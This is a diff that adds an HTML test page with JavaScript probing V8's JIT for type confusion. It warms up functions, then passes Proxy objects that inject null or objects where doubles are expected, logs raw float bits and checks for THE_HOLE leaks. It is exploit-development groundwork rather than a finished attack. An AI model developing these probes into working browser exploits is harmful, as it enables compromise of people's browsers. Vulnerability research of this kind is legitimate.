@@ -1,0 +1,119 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>LOADING</title></head>
+<body><h3>v16</h3>
+<pre id="log" style="font-size:10px;background:#111;color:#0f0;padding:8px;max-height:700px;overflow:auto;white-space:pre-wrap;"></pre>
+<script>
+function log(m){let e=document.getElementById('log');if(e)e.innerHTML+=m+'\n';document.title='['+m.substring(0,50)+']';}
+var cv=new ArrayBuffer(8);var cf=new Float64Array(cv);var cb=new BigInt64Array(cv);
+function dtoi(f){cf[0]=f;return cb[0];}
+
+function fuzz(){
+  log('[*] v16 — Investigating map+proxy null result');
+
+  // Reproduce the null from v15
+  function mapDouble(arr){return arr.map(x=>x*2);}
+  let dblArr=[1.1,2.2,3.3,4.4];
+  for(let i=0;i<50000;i++) mapDouble(dblArr);
+  log('[+] Warmup done');
+
+  let handler={
+    get(t,p){
+      if(p==='length') return 4;
+      if(p==='map') return Array.prototype.map;
+      if(p==='constructor') return Array;
+      let i=Number(p);
+      if(!isNaN(i)){
+        if(i===2) return {}; // object instead of double at index 2
+        return t[i];
+      }
+      return Reflect.get(t,p);
+    }
+  };
+
+  // Run multiple times to confirm
+  let nullCount=0, nanCount=0, otherCount=0;
+  let proxy=new Proxy(dblArr,handler);
+  for(let trial=0;trial<100;trial++){
+    try{
+      let result=mapDouble(proxy);
+      let v=result[2];
+      if(v===null) nullCount++;
+      else if(Number.isNaN(v)) nanCount++;
+      else otherCount++;
+      if(trial<5){
+        log('[+] trial '+trial+': ['+result.map(x=>String(x)).join(',')+']');
+        log('    result[2] === null: '+(v===null)+', isNaN: '+Number.isNaN(v)+', type: '+typeof v);
+        // Try to get the raw bits
+        if(typeof v==='number'){
+          log('    raw bits: 0x'+dtoi(v).toString(16));
+        }
+        // Check if it's THE_HOLE
+        if(v===undefined){
+          log('    [!] undefined — possible THE_HOLE leak!');
+        }
+      }
+    }catch(e){
+      if(trial<5) log('[!] trial '+trial+': '+e.message.substring(0,80));
+    }
+  }
+  log('\n[+] Results over 100 trials: null='+nullCount+' NaN='+nanCount+' other='+otherCount);
+
+  // Now investigate: is null in a PACKED_DOUBLE array special?
+  log('\n=== null in PACKED_DOUBLE context ===');
+  let testArr=[1.1, null, 3.3];
+  log('[+] [1.1,null,3.3] typeof[1]='+typeof testArr[1]+' value='+testArr[1]);
+  // In V8, PACKED_DOUBLE arrays can't contain null — this forces transition to PACKED_ELEMENTS
+  // If JIT compiled code expects PACKED_DOUBLE but gets null, that's type confusion
+
+  // Direct test: create array, force JIT to treat as doubles, then inject null
+  log('\n=== Direct PACKED_DOUBLE null injection ===');
+  function readIdx(arr,i){return arr[i];}
+  let da=[1.1,2.2,3.3];
+  for(let i=0;i<100000;i++) readIdx(da,0);
+  log('[+] readIdx JIT warmup done');
+  // Now create proxy that looks like double array but has null
+  let nullProxy=new Proxy([1.1,2.2,3.3],{
+    get(t,p){
+      if(p==='length') return 3;
+      let i=Number(p);
+      if(!isNaN(i)){
+        if(i===1) return null; // inject null where JIT expects double
+        return t[i];
+      }
+      return Reflect.get(t,p);
+    }
+  });
+  for(let i=0;i<3;i++){
+    let v=readIdx(nullProxy,i);
+    log('[+] readIdx(proxy,'+i+')='+v+' type='+typeof v);
+    if(typeof v==='number') log('    bits=0x'+dtoi(v).toString(16));
+  }
+
+  // Most important: can we get V8 to store null in a PACKED_DOUBLE FixedDoubleArray?
+  log('\n=== Force null into FixedDoubleArray ===');
+  function makeAndRead(){
+    let a=mapDouble(proxy); // returns array with null at index 2
+    // If a is PACKED_DOUBLE, null would be stored as a raw bit pattern
+    // Check element kind
+    let allNums=true;
+    for(let i=0;i<a.length;i++){
+      if(typeof a[i]!=='number') allNums=false;
+    }
+    log('[+] All numbers: '+allNums);
+
+    // Try to read the raw bits of the null entry
+    // If it's stored in a PACKED_DOUBLE array, we might read it as a double
+    if(a[2]===null){
+      // Can we coerce it to read raw bits?
+      let raw=a[2];
+      log('[+] null entry raw: '+raw);
+      // In a real FixedDoubleArray, null shouldn't exist
+      // It's either the_hole (special NaN) or was converted to PACKED_ELEMENTS
+    }
+    return a;
+  }
+  for(let i=0;i<5;i++) makeAndRead();
+
+  log('\n[*] v16 done.');
+}
+setTimeout(fuzz,500);
+</script></body></html>
